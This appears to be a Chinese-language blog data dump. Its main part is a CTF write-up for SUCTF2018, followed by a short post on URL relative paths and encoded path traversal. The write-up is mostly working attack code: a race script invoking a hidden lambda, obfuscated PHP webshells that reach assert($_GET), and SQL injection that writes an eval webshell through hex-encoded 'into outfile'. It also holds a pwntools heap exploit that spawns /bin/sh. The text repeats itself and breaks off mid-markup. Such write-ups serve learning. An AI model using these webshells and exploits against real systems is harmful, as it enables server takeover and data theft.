.&quot;\\$MY();&quot;\n    .&quot;}&quot;);\nif(isset($_GET[&#39;func_name&#39;])){\n    $_GET[&quot;func_name&quot;]();\n    die();\n}\nshow_source(__FILE__);\n</code></pre><p>solve.py</p>\n<pre><code>import requests\nimport socket\nimport time\nfrom multiprocessing.dummy import Pool as ThreadPool\ntry:\n    requests.packages.urllib3.disable_warnings()\nexcept:\n    pass\n\ndef run(i):\n    while 1:\n        HOST = &#39;web.suctf.asuri.org&#39;\n        PORT = 81\n        url = &quot;http://web.suctf.asuri.org:81/index.php&quot;\n        requests.get(url)\n        print &#39;ok&#39;\n        time.sleep(0.5)\n        print requests.get(&#39;http://web.suctf.asuri.org:81/index.php?func_name=%00lambda_1&#39;).content\n\ni = 8\npool = ThreadPool( i )\nresult = pool.map_async( run, range(i) ).get(0xffff)\n</code></pre><h2 id=\"Getshell\"><a href=\"#Getshell\" class=\"headerlink\" title=\"Getshell\"></a>Getshell</h2><pre><code>if($contents=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;])){\n    $data=substr($contents,5);\n    foreach ($black_char as $b) {\n        if (stripos($data, $b) !== false){\n            die(&quot;illegal char&quot;);\n        }\n    }     \n}\n</code></pre><p>使用burp intruder找出未被过滤的可打印字符串。</p>\n<pre><code>$()[]_~=;.\n</code></pre><p>跑的时候需注意<code>Intruder=&gt;payloads=&gt;payload encoding</code> 处需取消勾选，否则会因为字符编码而不能得到正确的白名单。</p>\n<p>跑的时候可以在<code>Intruder=&gt;options=&gt;Grep-Match</code> 中选择 flag <code>illegal</code> ，这样就可以快速看到那些字符是合法的了。</p>\n<p>shell:</p>\n<pre><code>&lt;?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_____=~得[$_];$______=~第[$_];$_______=~学[$_];$_=_.$__.$___.$____;$_=$$_;$__=$_____.$______.$______.$___.$_______.$____;$__($_[_]);\n</code></pre><pre><code>&lt;?= \n$_=_==_;//1\n$__=~一[$_];//G\n$___=~了[$_];//E\n$____=~端[$_];//T\n$_____=~得[$_];//A\n$______=~第[$_];//S\n$_______=~学[$_];//R\n$_=_.$__.$___.$____;//_GET\n$_=$$_;//$_GET\n$__=$_____.$______.$______.$___.$_______.$____;//ASSERT\n$__($_[_]);//ASSERT($_GET[_]);\n</code></pre><pre><code>&lt;?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_=_.$__.$___.$____;$_=$$_;$_[_]($_[__]);\n</code></pre><pre><code>$_=_==_;//1\n$__=~一[$_];//G\n$___=~了[$_];//E\n$____=~端[$_];//T\n$_=_.$__.$___.$____;//_GET\n$_=$$_;//$_GET\n$_[_]($_[__]);//$_GET[_]($_GET[__]);\n</code></pre><h2 id=\"MultiSql\"><a href=\"#MultiSql\" class=\"headerlink\" title=\"MultiSql\"></a>MultiSql</h2><pre><code>@@secure_file_priv           限制intofile可以写入的文件目录\n</code></pre><p>waf.php</p>\n<pre><code>&lt;?php\n    function waf($str){\n        $black_str = &quot;/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i&quot;;\n        $str = preg_replace($black_str, &quot;@@&quot;,$str);\n        return addslashes($str);\n    }\n</code></pre><p>sql注入关键代码:</p>\n<pre><code>if (isset($_SESSION[&#39;user_name&#39;])) {\n    include_once(&#39;../header.php&#39;);\n    if (!isset($SESSION[&#39;user_id&#39;])) {\n        $sql = &quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&quot;.&quot;&#39;{$_SESSION[&#39;user_name&#39;]}&#39;&quot;;\n    echo $sql;        \n$data = mysqli_query($connect,$sql) or die(&#39;Mysql Error!!&#39;);\n        $result = mysqli_fetch_array($data);\n        var_dump($result);\n        $_SESSION[&#39;user_id&#39;] = $result[&#39;DWVS_user_id&#39;];\n    }\n\n    $html_avatar = htmlspecialchars($_SESSION[&#39;user_favicon&#39;]);\n\n\n    if(isset($_GET[&#39;id&#39;])){\n        $id=waf($_GET[&#39;id&#39;]);\n        $sql = &quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_id =&quot;.$id;\n        $data = mysqli_multi_query($connect,$sql) or die();\n\n        $result = mysqli_store_result($connect);\n        $row = mysqli_fetch_row($result);\n        echo &#39;&lt;h1&gt;user_id:&#39;.$row[0].&quot;&lt;/h1&gt;&lt;br&gt;&lt;h2&gt;user_name:&quot;.$row[1].&quot;&lt;/h2&gt;&lt;br&gt;&lt;h3&gt;注册时间：&quot;.$row[4].&quot;&lt;/h3&gt;&quot;;\n        mysqli_free_result($result);\n        die();\n    }\n    mysqli_close($connect);\n</code></pre><p>使用set跟hex编码的方式执行sql语句:</p>\n<pre><code>select user()                    =&gt;   0x73656c65637420757365722829\n</code></pre><pre><code>set @num=0x73656c65637420757365722829;prepare t from @num;execute t;\n</code></pre><p>写shell:</p>\n<pre><code>&lt;?php eval($_REQUEST[&#39;55332&#39;]);?&gt;       =&gt;   0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e\n</code></pre><pre><code>set @num=0x73656c65637420307833633366373036383730323036353736363136633238323435663532343535313535343535333534356232373335333533333333333232373564323933623366336520696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f77666f782e70687027;prepare t from @num;execute t;\n</code></pre><pre><code>select 0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e into outfile &#39;/var/www/html/favicon/wfox.php&#39;\n</code></pre><p>方法二:</p>\n<p>注册两个账号:</p>\n<pre><code class=\"sql\">&lt;?=$_GET[c];?&gt;                                        \n\n&lt;?=$_GET[c];?&gt;&#39;into outfile&#39;/var/www/html/favicon/c1.php\n</code></pre>\n<p>这样，当使用第二个账号登录的时候:</p>\n<pre><code>$sql = &quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&quot;.&quot;&#39;{$_SESSION[&#39;user_name&#39;]}&#39;&quot;;\n$sql = &quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&#39;&lt;?=$_GET[c];?&gt;&#39;into outfile&#39;/var/www/html/favicon/c1.php &#39; into outfile &#39;/var/www/html/favicon/c1.php&#39;;\n</code></pre><p>就会将我们的shell写入账号。</p>\n<h1 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h1><h2 id=\"Note\"><a href=\"#Note\" class=\"headerlink\" title=\"Note\"></a>Note</h2><pre><code>#!/usr/bin/env python2\n\nfrom pwn import *\nfrom IPython import embed\nimport re\n\ncontext.arch = &#39;amd64&#39;\n\nr = remote(&#39;pwn.suctf.asuri.org&#39;, 20003)\n\ndef add(size, content):\n    r.sendlineafter(&#39;&gt;&gt;&#39;, &#39;1&#39;)\n    r.sendlineafter(&#39;Size:&#39;, str(size))\n    r.sendlineafter(&#39;Content:&#39;, content)\n\ndef show(idx):\n    r.sendlineafter(&#39;&gt;&gt;&#39;, &#39;2&#39;)\n    r.sendlineafter(&#39;Index:&#39;, str(idx))\n    r.recvuntil(&#39;Content:&#39;)\n    return r.recvuntil(&#39;1.Add a not&#39;, drop=True)\n\ndef pandora():\n    r.sendlineafter(&#39;&gt;&gt;&#39;, &#39;3&#39;)\n    r.sendlineafter(&#39;yes:1)&#39;, &#39;1&#39;)\n\n\nadd(10, &#39;a&#39;*24+flat(0xec1))\nadd(4000, &#39;a&#39;)\npandora()\nx = show(0).strip()\nheap = u64(x.ljust(8, &#39;\\x00&#39;)) - 0x140\nprint &#39;heap:&#39;, hex(heap)\nadd(0x90-8, &#39;a&#39;*7)\nx = show(1).strip()\nlibc = u64(x.ljust(8, &#39;\\x00&#39;)) - 0x3bfb58\nprint &#39;libc:&#39;, hex(libc)\n\n#_IO_list_all = libc + 0x3c5520\n_IO_list_all = libc + 0x3c0500\n_IO_str_jumps = libc + 0x3bc4c0\n#system = libc + 0x45390\nsystem = libc + 0x456d0\npop_rax_rbx_rbp = libc + 0x1fa71\nret = libc + 0x1fa74\nadd(10, flat(\n    &#39;a&#39;*16,\n    0x0, 0x61,\n    0, _IO_list_all-0x10,\n    0, 1,\n    0, heap+0x1a0, heap+0x1a0,      # buf_base to heap &amp; buf_end-buf_base==0\n    [0]*18, _IO_str_jumps,\n    ret, system,                    # malloc do nothing, free(buf_base) == system(&#39;/bin/sh&#39;)\n    &#39;/bin/sh\\x00&#39;,\n))\n\n#raw_input(&quot;@&quot;)\nr.sendlineafter(&#39;&gt;&gt;&#39;, &#39;1&#39;)\nr.sendlineafter(&#39;Size:&#39;, &#39;10&#39;)\n\n#embed()\nr.interactive()\n</code></pre>","site":{"data":{}},"excerpt":"<h1 id=\"SUCTF2018\"><a href=\"#SUCTF2018\" class=\"headerlink\" title=\"SUCTF2018\"></a>SUCTF2018</h1>","more":"<p>没做过，自己复现</p>\n<p>docker仓库：</p>\n<pre><code>suctf/2018-web-multi_sql\nsuctf/2018-web-homework\nsuctf/2018-web-hateit\nsuctf/2018-web-getshell\nsuctf/2018-web-annonymous\nsuctf/2018-pwn-note\nsuctf/2018-pwn-noend\nsuctf/2018-pwn-lock2\nsuctf/2018-pwn-heapprint\nsuctf/2018-pwn-heap\nsuctf/2018-misc-padding\nsuctf/2018-misc-game\nsuctf/2018-misc-rsagood\nsuctf/2018-misc-rsa\nsuctf/2018-misc-enjoy\nsuctf/2018-misc-pass\n</code></pre><h2 id=\"Anonymous\"><a href=\"#Anonymous\" class=\"headerlink\" title=\"Anonymous\"></a>Anonymous</h2><pre><code>&lt;?php\n$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);\n$hash = bin2hex(openssl_random_pseudo_bytes(32));\neval(&quot;function SUCTF_$hash(){&quot;\n    .&quot;global \\$MY;&quot;\n    .&quot;\\$MY();&quot;\n    .&quot;}&quot;);\nif(isset($_GET[&#39;func_name&#39;])){\n    $_GET[&quot;func_name&quot;]();\n    die();\n}\nshow_source(__FILE__);\n</code></pre><p>solve.py</p>\n<pre><code>import requests\nimport socket\nimport time\nfrom multiprocessing.dummy import Pool as ThreadPool\ntry:\n    requests.packages.urllib3.disable_warnings()\nexcept:\n    pass\n\ndef run(i):\n    while 1:\n        HOST = &#39;web.suctf.asuri.org&#39;\n        PORT = 81\n        url = &quot;http://web.suctf.asuri.org:81/index.php&quot;\n        requests.get(url)\n        print &#39;ok&#39;\n        time.sleep(0.5)\n        print requests.get(&#39;http://web.suctf.asuri.org:81/index.php?func_name=%00lambda_1&#39;).content\n\ni = 8\npool = ThreadPool( i )\nresult = pool.map_async( run, range(i) ).get(0xffff)\n</code></pre><h2 id=\"Getshell\"><a href=\"#Getshell\" class=\"headerlink\" title=\"Getshell\"></a>Getshell</h2><pre><code>if($contents=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;])){\n    $data=substr($contents,5);\n    foreach ($black_char as $b) {\n        if (stripos($data, $b) !== false){\n            die(&quot;illegal char&quot;);\n        }\n    }     \n}\n</code></pre><p>使用burp intruder找出未被过滤的可打印字符串。</p>\n<pre><code>$()[]_~=;.\n</code></pre><p>跑的时候需注意<code>Intruder=&gt;payloads=&gt;payload encoding</code> 处需取消勾选，否则会因为字符编码而不能得到正确的白名单。</p>\n<p>跑的时候可以在<code>Intruder=&gt;options=&gt;Grep-Match</code> 中选择 flag <code>illegal</code> ，这样就可以快速看到那些字符是合法的了。</p>\n<p>shell:</p>\n<pre><code>&lt;?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_____=~得[$_];$______=~第[$_];$_______=~学[$_];$_=_.$__.$___.$____;$_=$$_;$__=$_____.$______.$______.$___.$_______.$____;$__($_[_]);\n</code></pre><pre><code>&lt;?= \n$_=_==_;//1\n$__=~一[$_];//G\n$___=~了[$_];//E\n$____=~端[$_];//T\n$_____=~得[$_];//A\n$______=~第[$_];//S\n$_______=~学[$_];//R\n$_=_.$__.$___.$____;//_GET\n$_=$$_;//$_GET\n$__=$_____.$______.$______.$___.$_______.$____;//ASSERT\n$__($_[_]);//ASSERT($_GET[_]);\n</code></pre><pre><code>&lt;?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_=_.$__.$___.$____;$_=$$_;$_[_]($_[__]);\n</code></pre><pre><code>$_=_==_;//1\n$__=~一[$_];//G\n$___=~了[$_];//E\n$____=~端[$_];//T\n$_=_.$__.$___.$____;//_GET\n$_=$$_;//$_GET\n$_[_]($_[__]);//$_GET[_]($_GET[__]);\n</code></pre><h2 id=\"MultiSql\"><a href=\"#MultiSql\" class=\"headerlink\" title=\"MultiSql\"></a>MultiSql</h2><pre><code>@@secure_file_priv           限制intofile可以写入的文件目录\n</code></pre><p>waf.php</p>\n<pre><code>&lt;?php\n    function waf($str){\n        $black_str = &quot;/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i&quot;;\n        $str = preg_replace($black_str, &quot;@@&quot;,$str);\n        return addslashes($str);\n    }\n</code></pre><p>sql注入关键代码:</p>\n<pre><code>if (isset($_SESSION[&#39;user_name&#39;])) {\n    include_once(&#39;../header.php&#39;);\n    if (!isset($SESSION[&#39;user_id&#39;])) {\n        $sql = &quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&quot;.&quot;&#39;{$_SESSION[&#39;user_name&#39;]}&#39;&quot;;\n    echo $sql;        \n$data = mysqli_query($connect,$sql) or die(&#39;Mysql Error!!&#39;);\n        $result = mysqli_fetch_array($data);\n        var_dump($result);\n        $_SESSION[&#39;user_id&#39;] = $result[&#39;DWVS_user_id&#39;];\n    }\n\n    $html_avatar = htmlspecialchars($_SESSION[&#39;user_favicon&#39;]);\n\n\n    if(isset($_GET[&#39;id&#39;])){\n        $id=waf($_GET[&#39;id&#39;]);\n        $sql = &quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_id =&quot;.$id;\n        $data = mysqli_multi_query($connect,$sql) or die();\n\n        $result = mysqli_store_result($connect);\n        $row = mysqli_fetch_row($result);\n        echo &#39;&lt;h1&gt;user_id:&#39;.$row[0].&quot;&lt;/h1&gt;&lt;br&gt;&lt;h2&gt;user_name:&quot;.$row[1].&quot;&lt;/h2&gt;&lt;br&gt;&lt;h3&gt;注册时间：&quot;.$row[4].&quot;&lt;/h3&gt;&quot;;\n        mysqli_free_result($result);\n        die();\n    }\n    mysqli_close($connect);\n</code></pre><p>使用set跟hex编码的方式执行sql语句:</p>\n<pre><code>select user()                    =&gt;   0x73656c65637420757365722829\n</code></pre><pre><code>set @num=0x73656c65637420757365722829;prepare t from @num;execute t;\n</code></pre><p>写shell:</p>\n<pre><code>&lt;?php eval($_REQUEST[&#39;55332&#39;]);?&gt;       =&gt;   0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e\n</code></pre><pre><code>set @num=0x73656c65637420307833633366373036383730323036353736363136633238323435663532343535313535343535333534356232373335333533333333333232373564323933623366336520696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f77666f782e70687027;prepare t from @num;execute t;\n</code></pre><pre><code>select 0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e into outfile &#39;/var/www/html/favicon/wfox.php&#39;\n</code></pre><p>方法二:</p>\n<p>注册两个账号:</p>\n<pre><code class=\"sql\">&lt;?=$_GET[c];?&gt;                                        \n\n&lt;?=$_GET[c];?&gt;&#39;into outfile&#39;/var/www/html/favicon/c1.php\n</code></pre>\n<p>这样，当使用第二个账号登录的时候:</p>\n<pre><code>$sql = &quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&quot;.&quot;&#39;{$_SESSION[&#39;user_name&#39;]}&#39;&quot;;\n$sql = &quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&#39;&lt;?=$_GET[c];?&gt;&#39;into outfile&#39;/var/www/html/favicon/c1.php &#39; into outfile &#39;/var/www/html/favicon/c1.php&#39;;\n</code></pre><p>就会将我们的shell写入账号。</p>\n<h1 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h1><h2 id=\"Note\"><a href=\"#Note\" class=\"headerlink\" title=\"Note\"></a>Note</h2><pre><code>#!/usr/bin/env python2\n\nfrom pwn import *\nfrom IPython import embed\nimport re\n\ncontext.arch = &#39;amd64&#39;\n\nr = remote(&#39;pwn.suctf.asuri.org&#39;, 20003)\n\ndef add(size, content):\n    r.sendlineafter(&#39;&gt;&gt;&#39;, &#39;1&#39;)\n    r.sendlineafter(&#39;Size:&#39;, str(size))\n    r.sendlineafter(&#39;Content:&#39;, content)\n\ndef show(idx):\n    r.sendlineafter(&#39;&gt;&gt;&#39;, &#39;2&#39;)\n    r.sendlineafter(&#39;Index:&#39;, str(idx))\n    r.recvuntil(&#39;Content:&#39;)\n    return r.recvuntil(&#39;1.Add a not&#39;, drop=True)\n\ndef pandora():\n    r.sendlineafter(&#39;&gt;&gt;&#39;, &#39;3&#39;)\n    r.sendlineafter(&#39;yes:1)&#39;, &#39;1&#39;)\n\n\nadd(10, &#39;a&#39;*24+flat(0xec1))\nadd(4000, &#39;a&#39;)\npandora()\nx = show(0).strip()\nheap = u64(x.ljust(8, &#39;\\x00&#39;)) - 0x140\nprint &#39;heap:&#39;, hex(heap)\nadd(0x90-8, &#39;a&#39;*7)\nx = show(1).strip()\nlibc = u64(x.ljust(8, &#39;\\x00&#39;)) - 0x3bfb58\nprint &#39;libc:&#39;, hex(libc)\n\n#_IO_list_all = libc + 0x3c5520\n_IO_list_all = libc + 0x3c0500\n_IO_str_jumps = libc + 0x3bc4c0\n#system = libc + 0x45390\nsystem = libc + 0x456d0\npop_rax_rbx_rbp = libc + 0x1fa71\nret = libc + 0x1fa74\nadd(10, flat(\n    &#39;a&#39;*16,\n    0x0, 0x61,\n    0, _IO_list_all-0x10,\n    0, 1,\n    0, heap+0x1a0, heap+0x1a0,      # buf_base to heap &amp; buf_end-buf_base==0\n    [0]*18, _IO_str_jumps,\n    ret, system,                    # malloc do nothing, free(buf_base) == system(&#39;/bin/sh&#39;)\n    &#39;/bin/sh\\x00&#39;,\n))\n\n#raw_input(&quot;@&quot;)\nr.sendlineafter(&#39;&gt;&gt;&#39;, &#39;1&#39;)\nr.sendlineafter(&#39;Size:&#39;, &#39;10&#39;)\n\n#embed()\nr.interactive()\n</code></pre>"},{"title":"url相对路径和绝对路径","date":"2018-03-27T01:53:14.000Z","_content":"jquery.min.js的绝对路径:\n\n```\nhttp://39.107.33.96:20000/static/js/jquery.min.js\n```\n\n##### 当前url: http://39.107.33.96:20000/index.php/view/\n\nhtml中引入jquery.min.js,相对路径:\n```\n<script src=\"../static/js/jquery.min.js\"></script>\n```   \n\n此时: 浏览器解析js的路径:  \n```\nhttp://39.107.33.96:20000/index.php/static/js/jquery.min.js  找不到\n```\n\n\n##### 当前url: http://39.107.33.96:20000/index.php/view\n\nhtml中引入jquery.min.js，采用相对路径:\n```\n<script src=\"../static/js/jquery.min.js\"></script>\n```   \n\n此时: js的路径:   http://39.107.33.96:20000/static/js/jquery.min.js 可以找到\n\n#### 注意:http://39.107.33.96:20000/index.php/view/article/1152 可访问\n\n##### 当前url: http://39.107.33.96:20000/index.php/view/article/1152/..%2f..%2f..%2f..%2findex.php\n\n对于php而言，它获得的请求是url解码后的，%2F会被解码为/，apache和nginx会按照目录的方式来返回我们请求的资源。\n也就是访问\n\n```\nhttp://39.107.33.96:20000/index.php/view/article/1152/../../../../index.php\n=>\nhttp://39.107.33.96:20000/index.php\n```\n\n浏览器在寻找js资源的时候，并没有对%2f进行解码，就认为\n..%2f..%2f..%2f..%2findex.php这一坨是一段数据，但是又没有人来接收这段数据，相当于报废。\n就好比输入url-https://www.baidu.com?id=1，向百度传递了一个参数id，但它后端没有接收的代码，相当于没有传递\n\njs的路径：\n\n```\n<script src=\"/static/js/jquery.min.js\"></script>\n解析之后:\nhttp://39.107.33.96:20000/static/js/jquery.min.js\n```\n\n```\n<script src=\"static/js/jquery.min.js\"></script>\n解析之后:\nhttp://39.107.33.96:20000/index.php/view/article/1152/static/js/jquery.min.js\n```\n\n采用相对路径引入js:\n当我们向服务器提交这个请求的时候，服务器会按照phpinfo模式来读取这个url，\n\n读到..%2f..%2f..%2f..%2findex.php这里就读不下去了，识别不了，退一步，把前面能识别的内容返回回来，也就是http://39.107.33.96:20000/index.php/view/article/1152\n也就是url:\n\n```\nhttp://39.107.33.96:20000/index.php/view/article/1152/static/js/jquery.min.js\n```\n返回的内容就是:\n```\nhttp://39.107.33.96:20000/index.php/view/article/1152\n```\n中返回的内容\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/url相对路径和绝对路径.md","raw":"---\ntitle: url相对路径和绝对路径\ndate: 2018-03-27 09:53:14\ntags:\n- 前端\n---\njquery.min.js的绝对路径:\n\n```\nhttp://39.107.33.96:20000/static/js/jquery.min.js\n```\n\n##### 当前url: http://39.107.33.96:20000/index.php/view/\n\nhtml中引入jquery.min.js,相对路径:\n```\n<script src=\"../static/js/jquery.min.js\"></script>\n```   \n\n此时: 浏览器解析js的路径:  \n```\nhttp://39.107.33.96:20000/index.php/static/js/jquery.min.js  找不到\n```\n\n\n##### 当前url: http://39.107.33.96:20000/index.php/view\n\nhtml中引入jquery.min.js，采用相对路径:\n```\n<script src=\"../static/js/jquery.min.js\"></script>\n```   \n\n此时: js的路径:   http://39.107.33.96:20000/static/js/jquery.min.js 可以找到\n\n#### 注意:http://39.107.33.96:20000/index.php/view/article/1152 可访问\n\n##### 当前url: http://39.107.33.96:20000/index.php/view/article/1152/..%2f..%2f..%2f..%2findex.php\n\n对于php而言，它获得的请求是url解码后的，%2F会被解码为/，apache和nginx会按照目录的方式来返回我们请求的资源。\n也就是访问\n\n```\nhttp://39.107.33.96:20000/index.php/view/article/1152/../../../../index.php\n=>\nhttp://39.107.33.96:20000/index.php\n```\n\n浏览器在寻找js资源的时候，并没有对%2f进行解码，就认为\n..%2f..%2f..%2f..%2findex.php这一坨是一段数据，但是又没有人来接收这段数据，相当于报废。\n就好比输入url-https://www.baidu.com?id=1，向百度传递了一个参数id，但它后端没有接收的代码，相当于没有传递\n\njs的路径：\n\n```\n<script src=\"/static/js/jquery.min.js\"></script>\n解析之后:\nhttp://39.107.33.96:20000/static/js/jquery.min.js\n```\n\n```\n<script src=\"static/js/jquery.min.js\"></script>\n解析之后:\nhttp://39.107.33.96:20000/index.php/view/article/1152/static/js/jquery.min.js\n```\n\n采用相对路径引入js:\n当我们向服务器提交这个请求的时候，服务器会按照phpinfo模式来读取这个url，\n\n读到..%2f..%2f..%2f..%2findex.php这里就读不下去了，识别不了，退一步，把前面能识别的内容返回回来，也就是http://39.107.33.96:20000/index.php/view/article/1152\n也就是url:\n\n```\nhttp://39.107.33.96:20000/index.php/view/article/1152/static/js/jquery.min.js\n```\n返回的内容就是:\n```\nhttp://39.107.33.96:20000/index.php/view/article/1152\n```\n中返回的内容\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"url相对路径和绝对路径","published":1,"updated":"2018-03-30T09:40:37.684Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jq10016ly4j60uzne1e","content":"<p>jquery.min.js的绝对路径:</p>\n<pre><code>http://39.107.33.96:20000/static/js/jquery.min.js\n</code></pre><h5 id=\"当前url-http-39-107-33-96-20000-index-php-view\"><a href=\"#当前url-http-39-107-33-96-20000-index-php-view\" class=\"headerlink\" title=\"当前url: http://39.107.33.96:20000/index.php/view/\"></a>当前url: <a href=\"http://39.107.33.96:20000/index.php/view/\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/view/</a></h5><p>html中引入jquery.min.js,相对路径:</p>\n<pre><code>&lt;script src=&quot;../static/js/jquery.min.js&quot;&gt;&lt;/script&gt;\n</code></pre><p>此时: 浏览器解析js的路径:  </p>\n<pre><code>http://39.107.33.96:20000/index.php/static/js/jquery.min.js  找不到\n</code></pre><h5 id=\"当前url-http-39-107-33-96-20000-index-php-view-1\"><a href=\"#当前url-http-39-107-33-96-20000-index-php-view-1\" class=\"headerlink\" title=\"当前url: http://39.107.33.96:20000/index.php/view\"></a>当前url: <a href=\"http://39.107.33.96:20000/index.php/view\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/view</a></h5><p>html中引入jquery.min.js，采用相对路径:</p>\n<pre><code>&lt;script src=&quot;../static/js/jquery.min.js&quot;&gt;&lt;/script&gt;\n</code></pre><p>此时: js的路径:   <a href=\"http://39.107.33.96:20000/static/js/jquery.min.js\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/static/js/jquery.min.js</a> 可以找到</p>\n<h4 id=\"注意-http-39-107-33-96-20000-index-php-view-article-1152-可访问\"><a href=\"#注意-http-39-107-33-96-20000-index-php-view-article-1152-可访问\" class=\"headerlink\" title=\"注意:http://39.107.33.96:20000/index.php/view/article/1152 可访问\"></a>注意:<a href=\"http://39.107.33.96:20000/index.php/view/article/1152\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/view/article/1152</a> 可访问</h4><h5 id=\"当前url-http-39-107-33-96-20000-index-php-view-article-1152-2f-2f-2f-2findex-php\"><a href=\"#当前url-http-39-107-33-96-20000-index-php-view-article-1152-2f-2f-2f-2findex-php\" class=\"headerlink\" title=\"当前url: http://39.107.33.96:20000/index.php/view/article/1152/..%2f..%2f..%2f..%2findex.php\"></a>当前url: <a href=\"http://39.107.33.96:20000/index.php/view/article/1152/..%2f..%2f..%2f..%2findex.php\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/view/article/1152/..%2f..%2f..%2f..%2findex.php</a></h5><p>对于php而言，它获得的请求是url解码后的，%2F会被解码为/，apache和nginx会按照目录的方式来返回我们请求的资源。<br>也就是访问</p>\n<pre><code>http://39.107.33.96:20000/index.php/view/article/1152/../../../../index.php\n=&gt;\nhttp://39.107.33.96:20000/index.php\n</code></pre><p>浏览器在寻找js资源的时候，并没有对%2f进行解码，就认为<br>..%2f..%2f..%2f..%2findex.php这一坨是一段数据，但是又没有人来接收这段数据，相当于报废。<br>就好比输入url-<a href=\"https://www.baidu.com?id=1，向百度传递了一个参数id，但它后端没有接收的代码，相当于没有传递\" target=\"_blank\" rel=\"noopener\">https://www.baidu.com?id=1，向百度传递了一个参数id，但它后端没有接收的代码，相当于没有传递</a></p>\n<p>js的路径：</p>\n<pre><code>&lt;script src=&quot;/static/js/jquery.min.js&quot;&gt;&lt;/script&gt;\n解析之后:\nhttp://39.107.33.96:20000/static/js/jquery.min.js\n</code></pre><pre><code>&lt;script src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt;\n解析之后:\nhttp://39.107.33.96:20000/index.php/view/article/1152/static/js/jquery.min.js\n</code></pre><p>采用相对路径引入js:<br>当我们向服务器提交这个请求的时候，服务器会按照phpinfo模式来读取这个url，</p>\n<p>读到..%2f..%2f..%2f..%2findex.php这里就读不下去了，识别不了，退一步，把前面能识别的内容返回回来，也就是<a href=\"http://39.107.33.96:20000/index.php/view/article/1152\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/view/article/1152</a><br>也就是url:</p>\n<pre><code>http://39.107.33.96:20000/index.php/view/article/1152/static/js/jquery.min.js\n</code></pre><p>返回的内容就是:</p>\n<pre><code>http://39.107.33.96:20000/index.php/view/article/1152\n</code></pre><p>中返回的内容</p>\n","site":{"data":{}},"excerpt":"","more":"<p>jquery.min.js的绝对路径:</p>\n<pre><code>http://39.107.33.96:20000/static/js/jquery.min.js\n</code></pre><h5 id=\"当前url-http-39-107-33-96-20000-index-php-view\"><a href=\"#当前url-http-39-107-33-96-20000-index-php-view\" class=\"headerlink\" title=\"当前url: http://39.107.33.96:20000/index.php/view/\"></a>当前url: <a href=\"http://39.107.33.96:20000/index.php/view/\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/view/</a></h5><p>html中引入jquery.min.js,相对路径:</p>\n<pre><code>&lt;script src=&quot;../static/js/jquery.min.js&quot;&gt;&lt;/script&gt;\n</code></pre><p>此时: 浏览器解析js的路径:  </p>\n<pre><code>http://39.107.33.96:20000/index.php/static/js/jquery.min.js  找不到\n</code></pre><h5 id=\"当前url-http-39-107-33-96-20000-index-php-view-1\"><a href=\"#当前url-http-39-107-33-96-20000-index-php-view-1\" class=\"headerlink\" title=\"当前url: http://39.107.33.96:20000/index.php/view\"></a>当前url: <a href=\"http://39.107.33.96:20000/index.php/view\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/view</a></h5><p>html中引入jquery.min.js，采用相对路径:</p>\n<pre><code>&lt;script src=&quot;../static/js/jquery.min.js&quot;&gt;&lt;/script&gt;\n</code></pre><p>此时: js的路径:   <a href=\"http://39.107.33.96:20000/static/js/jquery.min.js\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/static/js/jquery.min.js</a> 可以找到</p>\n<h4 id=\"注意-http-39-107-33-96-20000-index-php-view-article-1152-可访问\"><a href=\"#注意-http-39-107-33-96-20000-index-php-view-article-1152-可访问\" class=\"headerlink\" title=\"注意:http://39.107.33.96:20000/index.php/view/article/1152 可访问\"></a>注意:<a href=\"http://39.107.33.96:20000/index.php/view/article/1152\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/view/article/1152</a> 可访问</h4><h5 id=\"当前url-http-39-107-33-96-20000-index-php-view-article-1152-2f-2f-2f-2findex-php\"><a href=\"#当前url-http-39-107-33-96-20000-index-php-view-article-1152-2f-2f-2f-2findex-php\" class=\"headerlink\" title=\"当前url: 